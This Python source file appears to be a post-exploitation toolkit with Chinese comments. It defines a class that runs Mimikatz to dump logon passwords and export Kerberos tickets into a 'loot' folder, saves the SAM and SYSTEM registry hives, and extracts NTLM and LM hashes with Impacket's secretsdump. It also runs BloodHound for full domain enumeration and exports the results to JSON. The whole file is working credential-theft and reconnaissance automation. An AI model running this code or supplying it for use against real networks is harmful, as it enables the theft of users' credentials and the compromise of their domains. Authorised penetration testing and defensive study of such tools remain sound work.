#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import json
import os
from rich.console import Console
from typing import Dict, Any, Optional
from retry import retry

console = Console()

class PostExploit:
    def __init__(self, target: str, session_id: Optional[int] = None):
        self.target = target
        self.session_id = session_id
        self.results: Dict[str, Any] = {}
    
    def dump_credentials(self, output_dir: str = "./loot") -> Dict[str, Any]:
        """使用Mimikatz dump凭据"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            output_file = os.path.join(output_dir, f"{self.target}_credentials.txt")
            
            # 运行Mimikatz
            cmd = f"mimikatz.exe \"sekurlsa::logonpasswords\" \"sekurlsa::tickets /export\" \"exit\" > {output_file}"
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output, error = process.communicate()
            
            if process.returncode == 0:
                # 解析Mimikatz输出
                with open(output_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # 提取凭据信息
                credentials = self._parse_mimikatz_output(content)
                self.results['credentials'] = credentials
                
                console.print(f"[green]凭据已保存到: {output_file}[/green]")
                return credentials
            else:
                console.print(f"[red]Mimikatz执行失败: {error.decode()}[/red]")
                return {}
                
        except Exception as e:
            console.print(f"[red]凭据获取失败: {str(e)}[/red]")
            return {}
    
    def _parse_mimikatz_output(self, content: str) -> Dict[str, Any]:
        """解析Mimikatz输出"""
        credentials = {
            'passwords': [],
            'tickets': []
        }
        
        # 解析登录密码
        for line in content.split('\n'):
            if 'Username' in line:
                user = line.split(':')[1].strip()
            elif 'Password' in line:
                password = line.split(':')[1].strip()
                if user and password:
                    credentials['passwords'].append({
                        'username': user,
                        'password': password
                    })
        
        # 解析Kerberos票据
        for line in content.split('\n'):
            if 'Ticket' in line and '.kirbi' in line:
                credentials['tickets'].append(line.strip())
        
        return credentials
    
    def enum_domain(self, output_dir: str = "./bloodhound") -> Dict[str, Any]:
        """使用BloodHound枚举域环境"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            
            # 运行BloodHound收集器
            cmd = f"bloodhound-python -d {self.target} -ns {self.target} --zip -c All"
            process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=output_dir
            )
            output, error = process.communicate()
            
            if process.returncode == 0:
                # 查找生成的ZIP文件
                zip_files = [f for f in os.listdir(output_dir) if f.endswith('.zip')]
                if zip_files:
                    latest_zip = zip_files[-1]
                    self.results['bloodhound'] = {
                        'status': 'success',
                        'zip_file': os.path.join(output_dir, latest_zip)
                    }
                    console.print(f"[green]BloodHound数据已保存到: {latest_zip}[/green]")
                    return self.results['bloodhound']
            else:
                console.print(f"[red]BloodHound执行失败: {error.decode()}[/red]")
                return {}
                
        except Exception as e:
            console.print(f"[red]域枚举失败: {str(e)}[/red]")
            return {}
    
    def hashdump(self) -> Dict[str, Any]:
        """获取系统密码哈希"""
        try:
            cmd = "reg.exe save HKLM\\SAM sam.save && reg.exe save HKLM\\SYSTEM system.save"
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output, error = process.communicate()
            
            if process.returncode == 0:
                # 使用Impacket提取哈希
                cmd = f"secretsdump.py -sam sam.save -system system.save LOCAL"
                process = subprocess.Popen(
                    cmd.split(),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                output, error = process.communicate()
                
                if process.returncode == 0:
                    hashes = self._parse_secretsdump_output(output.decode())
                    self.results['hashes'] = hashes
                    return hashes
                else:
                    console.print(f"[red]哈希提取失败: {error.decode()}[/red]")
                    return {}
            else:
                console.print(f"[red]注册表保存失败: {error.decode()}[/red]")
                return {}
                
        except Exception as e:
            console.print(f"[red]哈希获取失败: {str(e)}[/red]")
            return {}
        finally:
            # 清理临时文件
            for f in ['sam.save', 'system.save']:
                if os.path.exists(f):
                    os.remove(f)
    
    def _parse_secretsdump_output(self, output: str) -> Dict[str, list]:
        """解析secretsdump输出"""
        hashes = {
            'ntlm': [],
            'lm': []
        }
        
        for line in output.split('\n'):
            if ':' in line:
                parts = line.split(':')
                if len(parts) >= 4:
                    username = parts[0]
                    lm_hash = parts[2]
                    nt_hash = parts[3]
                    
                    if lm_hash and lm_hash != "aad3b435b51404eeaad3b435b51404ee":
                        hashes['lm'].append({
                            'username': username,
                            'hash': lm_hash
                        })
                    
                    if nt_hash:
                        hashes['ntlm'].append({
                            'username': username,
                            'hash': nt_hash
                        })
        
        return hashes
    
    def export_results(self, filepath: str) -> None:
        """导出后渗透结果"""
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4)
            console.print(f"[green]后渗透结果已保存到: {filepath}[/green]")
        except Exception as e:
            console.print(f"[red]导出结果失败: {str(e)}[/red]") 